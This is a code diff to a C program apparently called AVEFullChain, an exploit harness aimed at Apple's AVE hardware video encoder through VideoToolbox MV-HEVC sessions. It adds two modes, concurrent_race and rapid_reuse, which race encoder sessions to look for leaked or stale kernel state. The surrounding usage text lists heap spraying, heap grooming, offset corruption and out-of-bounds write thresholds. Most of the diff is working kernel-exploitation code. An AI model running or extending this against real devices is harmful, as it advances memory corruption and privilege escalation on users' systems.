@@ -37,6 +37,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 #include <mach/mach.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <VideoToolbox/VideoToolbox.h>
@@ -675,6 +676,47 @@ static int phase6_spray(int encodes) {
     for (int i = 0; i < SPRAY_COUNT; i++)
         if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
     return corrupted;
+}
+
+typedef struct {
+    int thread_id;
+    int encodes;
+    int errors;
+    int max_pset_count;
+    size_t max_pset_bytes;
+    volatile int started;
+    volatile int done;
+} race_ctx_t;
+
+static volatile int g_race_go = 0;
+
+static void *race_thread_fn(void *arg) {
+    race_ctx_t *ctx = (race_ctx_t *)arg;
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+    if (!s) {
+        ctx->errors = -1;
+        ctx->done = 1;
+        return NULL;
+    }
+    ctx->started = 1;
+    while (!g_race_go) usleep(100);
+
+    for (int i = 0; i < ctx->encodes; i++) {
+        int st = encode_one_stereo_kf(s, i, 1920, 1080, 1, 1);
+        if (st != 0) {
+            ctx->errors++;
+            if (ctx->errors >= 10) break;
+        }
+        if ((int)g_last_pset_count > ctx->max_pset_count)
+            ctx->max_pset_count = (int)g_last_pset_count;
+        if (g_last_pset_total_bytes > ctx->max_pset_bytes)
+            ctx->max_pset_bytes = g_last_pset_total_bytes;
+    }
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    VTCompressionSessionInvalidate(s);
+    CFRelease(s);
+    ctx->done = 1;
+    return NULL;
 }
 
 int main(int argc, char *argv[]) {
@@ -2642,6 +2684,127 @@ cleanup_dummies:
         }
         VTCompressionSessionInvalidate(s); CFRelease(s);
 
+    } else if (strcmp(mode, "concurrent_race") == 0) {
+        rlog("CONCURRENT_RACE: Race multiple MV-HEVC encoder sessions\n");
+        rlog("Theory: If concurrent sessions share AVE hardware state,\n");
+        rlog("VPS table entries from one session might persist into another's\n");
+        rlog("encode pass before the counter is reset. Apple Forums FB23045975\n");
+        rlog("confirms concurrent 4K60 HEVC sessions cause dart-ave1 panics.\n\n");
+
+        int num_threads = (argc > 2) ? atoi(argv[2]) : 2;
+        int enc_per_thread = (argc > 3) ? atoi(argv[3]) : 100;
+        if (num_threads < 2) num_threads = 2;
+        if (num_threads > 8) num_threads = 8;
+
+        if (phase1_verify() != 0) goto done;
+
+        rlog("Threads: %d, encodes/thread: %d\n\n", num_threads, enc_per_thread);
+
+        race_ctx_t ctxs[8] = {0};
+        g_race_go = 0;
+        pthread_t threads[8];
+        for (int i = 0; i < num_threads; i++) {
+            ctxs[i].thread_id = i;
+            ctxs[i].encodes = enc_per_thread;
+        }
+
+        rlog("Creating %d encoder sessions + threads...\n", num_threads);
+        for (int i = 0; i < num_threads; i++) {
+            pthread_create(&threads[i], NULL, race_thread_fn, &ctxs[i]);
+        }
+
+        rlog("Waiting for all threads to create sessions...\n");
+        for (int i = 0; i < num_threads; i++) {
+            int wait = 0;
+            while (!ctxs[i].started && ctxs[i].errors != -1 && wait < 100) {
+                usleep(100000);
+                wait++;
+            }
+        }
+
+        rlog("GO! All threads encoding simultaneously.\n\n");
+        g_race_go = 1;
+
+        for (int i = 0; i < num_threads; i++) {
+            pthread_join(threads[i], NULL);
+        }
+
+        rlog("\n=== CONCURRENT RACE RESULTS ===\n");
+        int any_anomaly = 0;
+        for (int i = 0; i < num_threads; i++) {
+            rlog("Thread %d: errors=%d, max_pset=%d, max_bytes=%zu\n",
+                 i, ctxs[i].errors, ctxs[i].max_pset_count,
+                 ctxs[i].max_pset_bytes);
+            if (ctxs[i].max_pset_count > 4) {
+                rlog("  *** ANOMALY: pset_count > 4 — possible counter leak! ***\n");
+                any_anomaly = 1;
+            }
+            if (ctxs[i].max_pset_bytes > 140) {
+                rlog("  *** ANOMALY: bytes > 140 — possible cross-session state! ***\n");
+                any_anomaly = 1;
+            }
+        }
+        if (any_anomaly) {
+            rlog("\n*** RACE CONDITION DETECTED: Cross-session VPS state leaked ***\n");
+            rlog("This suggests the AVE hardware shares VPS table state between\n");
+            rlog("concurrent encoder sessions. Counter accumulation may be possible.\n");
+        } else {
+            rlog("\nNo anomalies detected. Sessions appear isolated.\n");
+            rlog("Try: more threads (3-4), higher resolution, or rapid create/destroy.\n");
+        }
+
+    } else if (strcmp(mode, "rapid_reuse") == 0) {
+        rlog("RAPID_REUSE: Rapidly create/encode/destroy sessions to race init\n");
+        rlog("Theory: Between kfree_data and constructor bzero, the counter\n");
+        rlog("field holds stale data. If we allocate fast enough, a new session\n");
+        rlog("might start encoding before the bzero completes on its buffer.\n\n");
+
+        int rounds = (argc > 2) ? atoi(argv[2]) : 500;
+        if (phase1_verify() != 0) goto done;
+
+        rlog("Rounds: %d (create→encode→destroy per round)\n\n", rounds);
+
+        int anomalies = 0;
+        size_t baseline_bytes = 0;
+        int baseline_set = 0;
+
+        for (int i = 0; i < rounds; i++) {
+            VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+            if (!s) {
+                if (i < 5 || i % 100 == 0) rlog("[%d] create FAILED\n", i);
+                continue;
+            }
+            int st = encode_one_stereo_kf(s, 0, 1920, 1080, 1, 1);
+            if (st == 0) {
+                if (!baseline_set) {
+                    baseline_bytes = g_last_pset_total_bytes;
+                    baseline_set = 1;
+                    rlog("Baseline: pset=%zu, bytes=%zu\n", g_last_pset_count, baseline_bytes);
+                }
+                if (g_last_pset_total_bytes != baseline_bytes) {
+                    anomalies++;
+                    rlog("[%d] *** BYTES CHANGED: %zu (baseline %zu) pset=%zu ***\n",
+                         i, g_last_pset_total_bytes, baseline_bytes, g_last_pset_count);
+                }
+                if ((int)g_last_pset_count > 4) {
+                    anomalies++;
+                    rlog("[%d] *** PSET COUNT ANOMALY: %zu (expected 4) ***\n",
+                         i, g_last_pset_count);
+                }
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+
+            if ((i+1) % 100 == 0)
+                rlog("[%d/%d] anomalies=%d\n", i+1, rounds, anomalies);
+        }
+
+        rlog("\nDone: %d rounds, %d anomalies\n", rounds, anomalies);
+        if (anomalies > 0)
+            rlog("*** STALE STATE DETECTED — counter or pset data leaked between sessions ***\n");
+        else
+            rlog("No stale state detected. Buffer appears fully reinitialized each time.\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -2666,6 +2829,9 @@ cleanup_dummies:
         rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
         rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
         rlog("  stereo_overflow [enc] [lid] -- MV-HEVC stereo overflow (default 100 enc, lid=1)\n");
+        rlog("  stereo_keyframe [enc]      -- Force-keyframe counter accumulation test\n");
+        rlog("  concurrent_race [threads] [enc] -- Race concurrent encoder sessions (2-8 threads)\n");
+        rlog("  rapid_reuse [rounds]       -- Rapid create/encode/destroy for stale state\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
